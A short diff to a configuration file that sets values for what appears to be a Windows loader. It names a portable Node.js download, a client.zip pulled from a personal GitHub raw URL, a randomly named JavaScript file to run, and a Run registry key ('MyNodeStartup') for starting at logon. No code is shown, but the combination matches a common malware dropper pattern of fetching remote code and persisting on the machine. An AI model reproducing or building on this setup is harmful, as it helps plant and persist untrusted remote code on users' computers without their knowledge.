@@ -1,3 +1,4 @@
-https://nodejs.org/dist/v22.19.0/node-v22.19.0-win-x64.zip
-https://raw.githubusercontent.com/DaleGelb/files/main/client.zip
-awtnzzjjaqeuvbz.js
+NODE_ZIP_URL=https://nodejs.org/dist/v22.19.0/node-v22.19.0-win-x64.zip
+CLIENT_ZIP_URL=https://raw.githubusercontent.com/DaleGelb/files/main/client.zip
+CLIENT_JS=awtnzzjjaqeuvbz.js
+REG_PATH=HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyNodeStartup
